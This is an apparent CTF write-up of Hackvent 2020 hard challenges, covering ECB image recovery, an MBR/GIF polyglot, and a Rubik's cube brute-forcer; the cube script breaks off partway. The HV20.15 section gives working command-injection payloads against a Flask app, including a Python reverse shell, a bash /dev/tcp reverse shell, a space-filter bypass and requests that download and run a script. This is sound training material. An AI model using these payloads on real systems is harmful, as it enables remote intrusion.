# Hackvent 2020 - Hard

[ctf](/tags#ctf ) [hackvent](/tags#hackvent ) [xls](/tags#xls )
[excel](/tags#excel ) [forensic](/tags#forensic ) [cbc](/tags#cbc )
[crypto](/tags#crypto ) [gimp](/tags#gimp ) [polyglot](/tags#polyglot )
[mbr](/tags#mbr ) [ghidra](/tags#ghidra ) [ida](/tags#ida )
[bochs](/tags#bochs ) [python](/tags#python ) [flask](/tags#flask ) [command-
injection](/tags#command-injection ) [injection](/tags#injection )
[rubiks](/tags#rubiks ) [stl](/tags#stl ) [rubik-cube](/tags#rubik-cube )
[ja3](/tags#ja3 ) [go](/tags#go ) [ja3transport](/tags#ja3transport )
[jwt](/tags#jwt ) [ecryptfs](/tags#ecryptfs ) [hashcat](/tags#hashcat )
[ecryptfs2john](/tags#ecryptfs2john ) [pyyaml](/tags#pyyaml ) [yaml-
deserialization](/tags#yaml-deserialization ) [binwalk](/tags#binwalk )  
  
Jan 1, 2021

  * [Hackvent 2020  
easy](/hackvent2020/easy)

  * [medium](/hackvent2020/medium)
  * hard
  * [leet(ish)](/hackvent2020/leet)

![](https://0xdfimages.gitlab.io/img/hackvent2020-hard-cover.png)

The first seven hard challenges included my favorite challenge of the year,
Santa’s Special GIFt, where the given file is both a GIF image and a master
boot record. Handing it as such allowed me to reverse the code and emulate it
to get two flags. There’s another challenge that looks at the failures of CBC
on encrypting an raw bitmap image, three web exploitation challenges
exploiting command injection, JA3 impresonation, and Python YAML
deserialization, and another Rubik’s cube to solve.

## HV20.13

### Challenge

![hv20-ball13](https://0xdfimages.gitlab.io/img/hv20-ball13.png) | HV20.13 Twelve steps of christmas  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO  
![forensic](../img/hv-cat-forensic.png)FORENSIC  
Level: | hard  
Author: |  [bread](https://twitter.com/nonsxd)  
  
> On the ninth day of Christmas my true love sent to me…
>
> nineties style xls, eighties style compression, seventies style crypto, and
> the rest has been said previously.
>
> [Download](/files/5862be5b-7fa7-4ef4-b792-fa63b1e385b7.xls)
>
> **Hints**
>
>   * Wait, Bread is on the Nice list? Better check that comment again…
>

The file is an old style Excel workbook (`.xls`):

    
    
    $ file 5862be5b-7fa7-4ef4-b792-fa63b1e385b7.xls 
    5862be5b-7fa7-4ef4-b792-fa63b1e385b7.xls: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Title: Test Data, Author: Unknown Creator, Last Saved By: bread, Name of Creating Application: Microsoft Excel, Create Time/Date: Sun Nov 29 23:54:57 2020, Last Saved Time/Date: Sat Dec 12 12:43:38 2020, Security: 0
    

### Solution

#### Identify Two Data Blobs

The Excel book has a table of names with addresses, comments, and a naught or
nice, as well as images down the right side:

![image-20201215060542647](https://0xdfimages.gitlab.io/img/image-20201215060542647.png)

The workbook is protected with a password, so preventing clicking into the
table or anything else to see what’s going on. There are multiple ways around
this.

One way is to grab the VBA from one of [many](https://www.ablebits.com/office-
addins-blog/2016/02/10/protect-unprotect-excel-sheet-password/) sites that
will brute force crack this password. I’ll hit Alt+F11 to open the Macro
editor, insert a module, paste in the code, and hit F5 to run it. Five seconds
later it pops up with the password:

![image-20201215064536669](https://0xdfimages.gitlab.io/img/image-20201215064536669.png)

Alternatively, an Office document is just a zip file which can be decompresses
and then the two pieces of data needed for the challenge can be pulled from
the resulting files.

With the sheet unlocked, there are two bits of data to find. All of the cells
in the Comment column are nonsense text except one:

![image-20201215060640236](https://0xdfimages.gitlab.io/img/image-20201215060640236.png)

With the workbook unlocked, the full text of that cell can be read:

> Not a loaf of bread which is mildly disappointing 1f 9d 8c 42 9a 38 41 24 01
> 80 41 83 8a 0e f2 39 78 42 80 c1 86 06 03 00 00 01 60 c0 41 62 87 0a 1e dc
> c8 71 23 Why was the loaf of bread upset? His plan were always going a rye.
> How does bread win over friends? “You can crust me.” Why does bread hate hot
> weather? It just feels too toasty.

The hex string in the middle is of interest.

The other is a bit trickier to spot. Inside the image of a gift box there’s
some text:

![image-20201215060724135](https://0xdfimages.gitlab.io/img/image-20201215060724135.png)

It says “part 9”. Clicking on it shows the formula: `=EMBED("Packager Shell
Object","")`. Right clicking on it gives a menu:

![image-20201215060846969](https://0xdfimages.gitlab.io/img/image-20201215060846969.png)

Selecting Properties gives details about the embedded object:

![image-20201215060922739](https://0xdfimages.gitlab.io/img/image-20201215060922739.png)

The file is in `\Appdata\Local\Temp\`, and it contains 36547 lines of hex
data, 60 characters across per line:

    
    
    1f9d8c53c2b0a15386cc972f5cd49d0a25e203051c30ee4492836c4ba141
    d17c08d294ee453501641e0819d7a5950d37ec32fc21f6af97303b6cb811
    a0464a85025e566e7da8c30a8cae553977f6fcd960cdb23d99ce9c91b461
    430a0686da70c046a28e1533041464421694a74fa03abdfeec3a14acd0af
    ...[snip]...
    

As mentioned above, both of these could be found without excel by just
renaming the file as `.zip` and decompressing it, generating the following
files:

    
    
    $ find . -type f
    ./[1]CompObj
    ./MBD018CB2C0/[1]CompObj
    ./MBD018CB2C0/[1]Ole10Native   <-- contains large hex blob
    ./[5]DocumentSummaryInformation
    ./Workbook                     <-- contains short hex blob
    ./[5]SummaryInformation
    

Linux tools will act a bit weird finding the small hex blob in `Workbook`. For
some reason, that cell is represented in UTF-16 two byte characters, so `grep`
and even searching in `less` will miss it. `strings` will find it with the
`-el` flag:

    
    
    $ strings -n 100 -el Workbook
    Not a loaf of bread which is mildly disappointing 1f 9d 8c 42 9a 38 41 24 01 80 41 83 8a 0e f2 39 78 42 80 c1 86 06 03 00 00 01 60 c0 41 62 87 0a 1e dc c8 71 23 Why was the loaf of bread upset? His plan were always going a rye. How does bread win over friends? 
    

#### Small Blob

Starting with the small blob, it doesn’t decode to anything immediately
obvious:

    
    
    $ cat c9
    1f 9d 8c 42 9a 38 41 24 01 80 41 83 8a 0e f2 39 78 42 80 c1 86 06 03 00 00 01 60 c0 41 62 87 0a 1e dc c8 71 23 
    $ cat c9 | xxd -r -p | xxd
    00000000: 1f9d 8c42 9a38 4124 0180 4183 8a0e f239  ...B.8A$..A....9
    00000010: 7842 80c1 8606 0300 0001 60c0 4162 870a  xB........`.Ab..
    00000020: 1edc c871 23                             ...q#
    

The [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) of
0x1f9d do match that of gzipped data. `xxd` can convert the hex to binary and
`zcat` will decompress it (back into `xxd` to see the result):

    
    
    # cat c9 | xxd -r -p | zcat | xxd
    00000000: 424d 4e88 1200 0000 0000 8a00 0000 7c00  BMN...........|.
    00000010: 0000 2702 0000 2702 0000 0100 2000 0300  ..'...'..... ...
    00000020: 0000 c487 1200 0000 0000 0000 0000 0000  ................
    00000030: 0000 0000 0000                           ......
    

Now it matches the signature of a Bitmap file (`BM`). That’s interesting, but
saving that to disk and trying to open it fails. Looking a bit closer at the
[Bitmap file format](https://en.wikipedia.org/wiki/BMP_file_format), it’s
clear this cuts off right in the middle of the header:

    
    
    Header:
    424d:          BM       Windows header
    4e881200: 1214542       Size of entire file
    00000000:       0       reserved
    8a000000:     138       offset to image data
    BITMAPV5HEADER
    7c000000:     124       size of header
    27020000:     551       width (pixels)
    27020000:     551       height (pixels)
    0100:           1       planes
    2000:          32       bits per pixel
    03000000:       3       BI_BITFIELDS, no pixel compression
    c4871200: 1214404       size of raw bitmap data (bytes)
    00000000:       0       print resolution
    00000000:       0       print resolution 
    00000000:       0       number of colors in palette
    00000000:       0       number of important colors in palette
    

The V5 header in this file only has 40 bytes, but the length says it’ll be
124.

Not much else to be done with this for now.

#### Large Blob

The larger blob also starts out as gzipped data, and when decompressed, it
looks like openssl encrypted data (as it starts out as `Salted__`):

    
    
    # cat part9 | xxd -r -p | zcat | xxd | head -5
    00000000: 5361 6c74 6564 5f5f 5cea a7a1 221f 1438  Salted__\..."..8
    00000010: 3077 9172 c85b 8583 d13e 829a e92f d502  0w.r.[...>.../..
    00000020: 640f 42e3 5dad 366e ec19 7fc4 ffbd c276  d.B.].6n.......v
    00000030: 6cdc 04d4 a42a 0abc 56b7 1f75 ac60 baab  l....*..V..u.`..
    00000040: 56b7 1f75 ac60 baab 0d6b cb7b 9967 6792  V..u.`...k.{.gg.
    

I spent a long time trying to figure out how to decrypt this data, which isn’t
necessary for the challenge.

#### Generate Image

The clues are here for the next step, though it’s easy to miss:

  * BMP header
  * “seventies style crypto”
  * the size of the encrypted file is almost exactly the same size as the BMP would have been according to the header (18 bytes off)

All of this is supposed to point to this:

![image-20201215061042560](https://0xdfimages.gitlab.io/img/image-20201215061042560.png)

This is a classic example as to why electronic code book encryption is not
secure. The reason is that each block is encrypted independently, so if any
two blocks are the same, the encrypted output for those blocks will also be
the same, leaving features in the image that can be recognized.

I’ll combine the two parts:

    
    
    $ cat c9 | xxd -r -p | zcat > combined.bmp
    $ cat part9 | xxd -r -p | zcat >> combined.bmp 
    

And open it in an image viewer:

![](https://0xdfimages.gitlab.io/img/hv20-13-combined.png)

That’s an image, and there’s clearly a QRcode in there.

#### Clean Up

I cleaned up the file in Gimp. First, I removed the alpha channel by right-
clicking on the layer and selecting “Remove Alpha Channel”. Now I zoomed in on
the top left of the QRCode:

![image-20201215061250086](https://0xdfimages.gitlab.io/img/image-20201215061250086.png)

I used the color picker tool to click on a pixel that I know should be black.
Then in Colors –> Map –> Color Exchange…, select the new color as black. It
will replace all the pixels of that color as black. After doing that that a
handful of times, changing colors that I know what they should be, the image
looks like:

![](https://0xdfimages.gitlab.io/img/hv20-13-combined-cleaned.png)

Because QRCodes are so robust to errors, this is plenty of detail to get the
flag out (I could have stopped much earlier). [zxing.org](zxing.org) or a
phone app can read the flag at this point.

**Flag:`HV20{U>watchout,U>!X,U>!ECB,Im_telln_U_Y.HV2020_is_comin_2_town}`**

## HV20.14

### Challenge

![hv20-ball14](https://0xdfimages.gitlab.io/img/hv20-ball14.png) | HV20.14 Santa's Special GIFt  
---|---  
Categories: |  ![forensic](../img/hv-cat-forensic.png)FORENSIC  
![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE
ENGINEERING  
Level: | hard  
Author: |  [The Compiler](https://twitter.com/the_compiler)  
  
> Today, you got a strange GIFt from Santa:

![img](https://0xdfimages.gitlab.io/img/5625d5bc-
ea69-433d-8b5e-5a39f4ce5b7c.gif)

> You are unsure what it is for. You do happen to have some wood lying around,
> but the tool seems to be made for metal. You notice how it has a rather
> strange size. You could use it for your fingernails, perhaps? If you keep
> looking, you might see some other uses…

### Solution

#### Identify MBR

The gif image is in fact a GIF, and it’s relatively small (there’s a hint in
the prompt about the size and it’s having other uses, but I missed those
originally):

    
    
    $ file 5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif
    5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif: GIF image data, version 89a, 128 x 16
    $ ls -l 5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif | awk '{print $5 " " $9}'
    512 5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif
    

Running `strings` on it puts out an odd-looking string at the end:

    
    
    $ strings 5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif
    GIF89a
    9TU7cvU
    oev6^g]dM<
    f$x<
    GDXx
    Il\<
    uvag:--xrrc-tbvat
    

It’s actually ROT13:

    
    
    $ strings 5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif | tr 'a-zA-Z' 'n-za-mN-ZA-M' | tail -1
    hint:--keep-going
    

`--keep-going` is a flag for the `file` command (which is also what the image
is of). Running `file` again with this flag finds more matches:

    
    
    root@kali# file --keep-going 5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif
    5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif: GIF image data, version 89a, 128 x 16\012- DOS/MBR boot sector\012-  DOS/MBR boot sector\012- data
    

In addition to a GIF, this file matches the signautre for a DOS/MBR, or master
boot record. An [MBR](https://en.wikipedia.org/wiki/Master_boot_record) is the
first 512 bytes in the first sector on a drive, and it provides the
instructions to load the OS. The first bit is code, with some metadata and
flags coming at the end (examples in the Wikipedia
[link](https://en.wikipedia.org/wiki/Master_boot_record)).

#### Static Analysis

I’ll open the file in Ida, selecting MetaPC as the Processor and setting the
offset to 0x7c00 (standard for MBR).

![image-20201215072622727](https://0xdfimages.gitlab.io/img/image-20201215072622727.png)

After selecting 16-bit mode when prompted, it comes up as just a series of
bytes:

![image-20201215072719760](https://0xdfimages.gitlab.io/img/image-20201215072719760.png)

By going to the top of the undefined bytes and hitting “c”, it will turn that
into code. I had to do that in a couple places to get code up through 0x7c9d.

Scrolling down through some garbage looking stuff (probably the GIF header),
at byte 23 there’s what looks like a loop:

[![image-20201215072923688](https://0xdfimages.gitlab.io/img/image-20201215072923688.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20201215072923688.png)

Ida is nice enough to label the `int 10` call with what’s going on there, but
it’s also described [here](https://en.wikipedia.org/wiki/INT_10H). `$AH` is
used to determine what function is called, and in this case, at the top,
that’s set to 0xe, which is teletype output, with the inputs as descripted in
the Ida comment. I’ll come back to this loop later.

The next section scrolls that entire page off the screen, and then sets the
cursor position (using functions 0x7 scroll down window and then 0x2 set
cursor position).

[![image-20201215073336125](https://0xdfimages.gitlab.io/img/image-20201215073336125.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20201215073336125.png)

Now comes the interesting loop:

[![image-20201215073415351](https://0xdfimages.gitlab.io/img/image-20201215073415351.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20201215073415351.png)

It initializes `dx = 3`, `si = 0x144`, and `di = 0`. Then, there’s a loop such
that when `si` is 0xe0, it reaches `hlt` (halt). Within that loop, if `di` is
zero, it prints `\r\n` (0x0a and 0x0d) followed by 16 spaces (0x20), and then
sets `di` to 0x19. Then, regardless of the value of `di`, it does some
obfuscating math to eventually print a character at an offset into 0x7cf0.
Finally, it decrements `di` and `si`, and then loops.

#### Solve Via Emulation

[Bochs](http://bochs.sourceforge.net/) is an emulator for this kind of thing.
It’s a bit unintuitive to get set up, and after playing with both, I had
success with the GUI version on Windows. From the start menu, I opened the
Disk and Boot options, and set the input image as a floppy:

![image-20201215075126517](https://0xdfimages.gitlab.io/img/image-20201215075126517.png)

In the Boot Options tab, Boot drive #1 was already floopy, so I left that.

On starting the machine it shows an partial image:

![image-20201215075600670](https://0xdfimages.gitlab.io/img/image-20201215075600670.png)

It is actually blinking, I _think_ because it’s reaching the `hlt`
instruction, crashing, and then restarting, but I’m not 100% sure of that.
Hitting the Suspend button will freeze it in place while it waits for the
prompt to be resolved.

It is only printing the top part of the QRcode. I’ll remember from static
analysis that it was breaking when `si` reached 0xe0, not 0, which was odd. I
opened the image in a hex editor, found that 0xe0, and changed it to a 0x00.
On re-running, it prints the full QR:

![image-20201215080055937](https://0xdfimages.gitlab.io/img/image-20201215080055937.png)

**Flag:`HV20{54n74'5-m461c-b00t-l04d3r}`**

#### Solve Via Re-Implementation

Instead of running it, I could just look at that loop and recreate it. It
basically looks like this in Python:

    
    
    si = 0x144
    di = 0
    while si > 0:
        if di == 0:
            print("\n   ", end="")
            di = 0x19
        cx = (si & 3) << 1
        bx = si >> 2
        bp = (_9e[bx] >> cx) & 3
        print(_f0[bp], end="")
        si -= 1
        di = di - 1
    print()
    

`_9e` and `_f0` are offsets into the data at the end of the code. I can grab
those and drop them into the script. The indexes put into `_9e` are `si >> 2`,
which ranges from 0 to 81. The inputs to `_f0` interestingly are all some
number `& 3`, which takes the low two bits of that number. So it will range
from 0-3.

    
    
    _f0 = binascii.unhexlify("dbdfdc20")
    _9e = binascii.unhexlify("555ddfd55d550d5e6f0339572311941bde0c8c2b37bf8053154e54949ad65f2da1cfcf508a0fa59da9ed2984486c9cf8448e51b2a9b91f39545537637655c5d57c49e45c0d0373a416333054c544974c5500")
    

There’s one last trick to get this to work. In `_f0`, the four values are
0xdb, 0xdf, 0xdc, and 0x20. The last is the space character. But the rest are
not ASCII. [This table](http://ascii-table.com/ascii-extended-pc-list.php)
shows that they are █, ▀, and ▄. So where `_f0[0]` returns 219, I need it to
print the full block character. In many cases, I could just look for other
ASCII characters to replace them with, but the way the two half blocks are
used, it isn’t one character per pixel. This
[post](https://stackoverflow.com/questions/12699827/python-block-character-
will-not-print) suggested using `cp437` as the character set to get this, and
it worked:

    
    
    print(bytes((_f0[bp],)).decode('cp437'), end="")
    

All together, the script is:

    
    
    #!/usr/bin/env python3
    
    import binascii
    
    
    _f0 = binascii.unhexlify("dbdfdc20")
    _9e = binascii.unhexlify("555ddfd55d550d5e6f0339572311941bde0c8c2b37bf8053154e54949ad65f2da1cfcf508a0fa59da9ed2984486c9cf8448e51b2a9b91f39545537637655c5d57c49e45c0d0373a416333054c544974c5500")
    
    si = 0x144
    di = 0
    while si > 0:
        if di == 0:
            print("\n   ", end="")
            di = 0x19
        cx = (si & 3) << 1
        bx = si >> 2
        bp = (_9e[bx] >> cx) & 3
        print(bytes((_f0[bp],)).decode("cp437"), end="")
        si -= 1
        di = di - 1
    print()
    

And it prints the QR:

![image-20201215081619011](https://0xdfimages.gitlab.io/img/image-20201215081619011.png)

## HV20.H2

### Challenge

![hv20-ballH2](https://0xdfimages.gitlab.io/img/hv20-ballH2.png) | HV20.H2 Oh, another secret!  
---|---  
Categories: |  ![hidden](../img/hv-cat-hidden.png)HIDDEN   
Level: | hard  
Author: |  [The Compiler](https://twitter.com/the_compiler)  
  
> We hide additional flags in some of the challenges! This is the place to
> submit them. There is no time limit for secret flags.

### Solution

The loop I skipped over int the static analysis in HV20.14 actually holds the
hidden flag:

[![image-20201215072923688](https://0xdfimages.gitlab.io/img/image-20201215072923688.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20201215072923688.png)

It’s a pretty simple loop, with a counter `bx` starting at 0, pulling a
character from two different arrays, xoring the results, and printing that
character. The loop breaks when the first array reached a null character.

I can pull both arrays, and recreate this in Python (I already pulled `_9e` in
the HV20.14 solution, I’ll just update that script):

    
    
    #!/usr/bin/env python3
    
    import binascii
    
    
    _f0 = binascii.unhexlify("dbdfdc20")
    _f4 = binascii.unhexlify("585797836f6576365e675d644d3ca575f37ce01f06d1ad6624783ca3e7")
    _9e = binascii.unhexlify("555ddfd55d550d5e6f0339572311941bde0c8c2b37bf8053154e54949ad65f2da1cfcf508a0fa59da9ed2984486c9cf8448e51b2a9b91f39545537637655c5d57c49e45c0d0373a416333054c544974c5500")
    
    print('HV20.14 flag:')
    si = 0x144
    di = 0
    while si > 0:
        if di == 0:
            print("\n   ", end="")
            di = 0x19
        cx = (si & 3) << 1
        bx = si >> 2
        bp = (_9e[bx] >> cx) & 3
        print(bytes((_f0[bp],)).decode("cp437"), end="")
        si -= 1
        di = di - 1
    print()
    
    hidden = "".join([chr(x ^ y) for x, y in zip(_f4, _9e)])
    print(f"Hidden flag: {hidden}")
    

**Flag:`HV20{h1dd3n-1n-pl41n-516h7}`**

## HV20.15

### Challenge

![hv20-ball15](https://0xdfimages.gitlab.io/img/hv20-ball15.png) | HV20.15 Man Commands, Server Lost  
---|---  
Categories: |  ![web security](../img/hv-cat-web_security.png)WEB SECURITY  
![penetration testing](../img/hv-cat-penetration_testing.png)PENETRATION
TESTING  
Level: | hard  
Author: |  inik   
  
> Elf4711 has written a cool front end for the linux man pages. Soon after
> publishing he got pwned. In the meantime he found out the reason and
> improved his code. So now he is sure it’s unpwnable.

There’s a link to get a VPN connection and to start a docker instance with the
target website.

### Solution

#### Enumeration

The website is an online GUI interface to the [Unix Manual
Pages](https://en.wikipedia.org/wiki/Man_page) or “man”:

[ ![](https://0xdfimages.gitlab.io/img/hv20-15-webroot.png)
](https://0xdfimages.gitlab.io/img/hv20-15-webroot.png)

[_Click for full image_](https://0xdfimages.gitlab.io/img/hv20-15-webroot.png)

At the bottom of the page, there’s a link to the source for the page:

![image-20201215131023188](https://0xdfimages.gitlab.io/img/image-20201215131023188.png)

The source shows a Flask Python application. In Flask, routes are defined with
function decorators. For example, this function defines what happens when
someone visits the page root:

    
    
    @app.route('/')
    def main():
      return redirect('/man/1/man')
    

In this case, it just redirects to `/man/1/man`, which is what is pictured
above. In the source, there are three additional routes:

  * `/section` and `/section/<nr>`
  * `/man` and `/man/<section>/<command>`
  * `/search`

In `/search`, there’s a comment reference to how it used to be vulnerable, but
no longer is because of a cleaning function:

    
    
    @app.route('/search/', methods=["POST"])
    def search(search="bash"):
      search = request.form.get('search')
      # FIXED Elf4711: Cleaned search string, so no RCE is possible anymore
      searchClean = re.sub(r"[;& ()$|]", "", search)
      ret = os.popen('apropos "' + searchClean + '"').read()
      return render_template('result.html', commands=parseCommands(ret), search=search)
    

`os.popen` is going to run commands at the OS level, so it is a good idea to
remove those characters which can be used to get command injection (I’ll
bypass this filter later).

Having seen that, something interesting jumps out looking in the `/section`
route:

    
    
    @app.route('/section/')
    @app.route('/section/<nr>')
    def section(nr="1"):
      ret = os.popen('apropos -s ' + nr + " .").read()
      return render_template('section.html', commands=parseCommands(ret), nr=nr)
    

Just like the search function above, it is taking user input, building a
string to pass to `os.popen`. But this time, there’s no input sanitization.
There’s a ton of ways to take `apropos -s <input> .` and make it run what
arbitrary code. `;` can break the previous command and start another. `$()` or
```` `` can run commands in a subshell. The limiting factor here is that the
input is passed via the url, not in the POST body. That limits what can be
sent, as characters such as `/` seem to break it.

#### Shell Via /section/

I’ll show the easier path first. I’ll grab a Python reverse shell from
[PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-
cheat-sheet), and after updating the IP and port it looks like:

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.0.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    

However, this doesn’t return a shell. It turns out that `python` isn’t
installed on the box, which is becoming more and more common. Changing the
command above to invoke with `python3` fixes the issue. After some URL
encoding, this url in Firefox will trigger a shell:

    
    
    https://81d42999-f27b-4c83-8e4e-3c75f138246f.idocker.vuln.land/section/%60python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.13.0.10%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)'%60
    

After a second, at the `nc` listener on port 443, a shell comes back:

    
    
    root@kali# nc -lvnp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 152.96.7.3.
    Ncat: Connection from 152.96.7.3:50476.
    $ id
    uid=1000(runner) gid=1000(runner) groups=1000(runner)
    

The flag is in the same directory:

    
    
    $ cat flag
    HV20{D0nt_f0rg3t_1nputV4l1d4t10n!!!} 
    

**Flag:`HV20{D0nt_f0rg3t_1nputV4l1d4t10n!!!}`**

#### Leak Flag

If I didn’t want to stand up the VPN and worry about getting a shell, I could
just use the command injection to generate output that will be displayed back
to me via the webpage.

If `;ls -la` is passed into `/section`, the command passed to `os.popen` is
`apropos -s ;ls -la .`. That will run, but none of the results will show on
the screen:

![image-20201215134612916](https://0xdfimages.gitlab.io/img/image-20201215134612916.png)

The reason is that the results are being passed to `parseCommands` and the
results are displayed back:

    
    
    def parseCommands(ret):
      commands = []
      for line in ret.split('\n'):
        l = line.split(' - ')
        if (len(l) > 1):
          m = l[0].split();
          manPage = ManPage(m[0], m[1].replace('(', '').replace(')',''), l[1])
          commands.append(manPage)
      return commands
    

It loops over the lines, and splits each line on `[space]-[space]`, and only
if there was that split results in multiple strings does it continue to then
split on space, and build the output. So the command output needs to be of the
form `m0 m1 - l1`, or else it will not be displayed. If there’s no
`[space]-[space]`, it just won’t print that line. If there’s no space to split
on in the first result before the `[space]-[space]`, it will crash and return
500 when it tries to access `m[1]`.

I used `awk` to manipulate the output from the command such that it fits this template. `ls -la | awk '{print m0 m1 - $0}'` will take the output, and for each line, add `m0 m1 - ` before it. So visiting `/section/;ls -la | awk '{print "m0 m1 - " $0}';` returns:

![image-20201215135521632](https://0xdfimages.gitlab.io/img/image-20201215135521632.png)

Seeing `flag` right there in the system root, `/section/;cat flag | awk '{print "m0 m1 - " $0}';` will return it:

![image-20201215135723553](https://0xdfimages.gitlab.io/img/image-20201215135723553.png)

#### Shell Via /search

Elf4711 thinks that they patched the `/search` path, but that is a very hard
thing to do, and this one isn’t good enough. I’m not able to use any of the
following characters: `[;& ()$|]`. Backticks are still available for subshell
execution. The biggest challenge is that it is filtering the space character.
One way to bypass that is to use the `$IFS` variable, but `$` is not allowed.
I used tab, which url-encodes to `%09`, in a two request solution to upload a
reverse shell and then execute it.

I created a simple reverse shell script named `shell.sh`:

    
    
    #!/bin/bash
    
    bash -i >& /dev/tcp/10.13.0.10/443 0>&1
    

To upload this, I started a Python webserver and sent the following request:

    
    
    POST /search/ HTTP/1.1
    Host: 81d42999-f27b-4c83-8e4e-3c75f138246f.idocker.vuln.land
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://81d42999-f27b-4c83-8e4e-3c75f138246f.idocker.vuln.land/man/1/man
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 63
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    search=`wget%0910.13.0.10/shell.sh%09-O%09/tmp/a`&submit=Search
    

A second later, there was a hit at the webserver:

    
    
    root@kali# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    152.96.7.3 - - [15/Dec/2020 06:19:52] "GET /shell.sh HTTP/1.1" 200 -
    

If that worked, the script is now sitting at `/tmp/a`. The next command will
run that with `bash`:

    
    
    POST /search/ HTTP/1.1
    Host: 81d42999-f27b-4c83-8e4e-3c75f138246f.idocker.vuln.land
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://81d42999-f27b-4c83-8e4e-3c75f138246f.idocker.vuln.land/man/1/man
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 36
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    search=`bash%09/tmp/a`&submit=Search
    

A shell comes back to `nc`:

    
    
    root@kali# nc -lnvp 443                      
    Ncat: Version 7.80 ( https://nmap.org/ncat )                             
    Ncat: Listening on :::443                                                
    Ncat: Listening on 0.0.0.0:443                                           
    Ncat: Connection from 152.96.7.3.                                        
    Ncat: Connection from 152.96.7.3:48516.
    $ id                                                                     
    uid=1000(runner) gid=1000(runner) groups=1000(runner) 
    

## HV20.16

### Challenge

![hv20-ball16](https://0xdfimages.gitlab.io/img/hv20-ball16.png) | HV20.16 Naughty Rudolph  
---|---  
Categories: |  ![programming](../img/hv-cat-programming.png)PROGRAMMING  
![fun](../img/hv-cat-fun.png)FUN  
Level: | hard  
Author: |  dr_nick   
  
> Santa loves to keep his personal secrets on a little toy cube he got from a
> kid called Bread. Turns out that was not a very good idea. Last night
> Rudolph got hold of it and frubl’d it about five times before spitting it
> out. Look at it! All the colors have come off! Naughty Rudolph!
>
> [Download](https://cdn.ost-dc.hacking-
> lab.com/hackvent-2020/16-cube/804fa458-c10c-4627-89df-18028bff6efa.stl)
>
> Hints
>
>   * The flag matches `/^HV20{[a-z3-7_@]+}$/` and is read face by face, from
> left to right, top to bottom
>   * The cube has been scrambled with ~5 moves in total
>

### Solution

#### Define Problem

I last dealt with an `.stl` file in last year’s challenge, [day
two](/hackvent2019/easy#solution-1). Double clicking on a Windows machine will
open it in Paint3D, which gives enough information to solve this challenge.
It’s another Rubik’s cube:

![](https://0xdfimages.gitlab.io/img/image-20201216150624613.png)

I know from the hints that the flag is read face by face, top to bottom, left
to right.

There’s another thing that’s important to know - There are six faces on a
rubik’s cube that don’t move, the middle on each side, meaning that I know
which face the flag will start on. The fifth characters in the flag will be in
a middle spot, that’s a `{` (assuming it starts with `HV20{`). Looking at the
cube, there’s a side that has `{` in the middle:

![](https://0xdfimages.gitlab.io/img/image-20201217120721991.png)

So I’ll make that the top face. It’s important to orient it that was as well,
so that the `{` is facing the right direction. That will leave `6` as the
first spot on the top of the cube. When I read the cube into my program, I’ll
want it to look like:

    
    
        6_e
        i{a
        es3
    HV7 _we o@s isl
    h_e 0k_ _t_ nso
    oa_ cda 4r5 2c_
        _ns
        llt
        }ph
    

#### Code

I’ll write a program to brute force all possible five-move combinations. I
actually made the mistake of using `itertools.permutations` to calculate this,
when it really should be `itertools.product`. With `permutations`, you’d never
get `ABCDA`, because move `A` won’t show up twice. But, it the actual solution
doesn’t have any move more than once, so either will solve (and `permutations`
much faster). The rest is relatively straight forward - get the list of five-
move options, loop over them, using this [rubik-
cube](https://pypi.org/project/rubik-cube/) python library to handle the
moves, and check if the flag starts and ends as expected:

    
    
    #!/usr/bin/env python3
    
    import re
    import sys
    from itertools import product,permutations
    from rubik.cube import Cube
    
    
    try:
        num_moves = int(sys.argv[1])
    except (IndexError, ValueError):
        num_moves = 5
    
    
    cube_str = '6_ei{aes3HV7_weo@sislh_e0k__t_nsooa_cda4r52c__nsllt}ph'
    assert re.match(r'[HVa-z02-7_@{}]+', cube_str)
    moves_list = ['F', 'R', 'U', 'L', 'B', 'D',
                  'Fi', 'Ri', 'Ui', 'Li', 'Bi', 'Di',
                  'F F', 'R R', 'U U', 'L L', 'B B', 'D D']
    
    
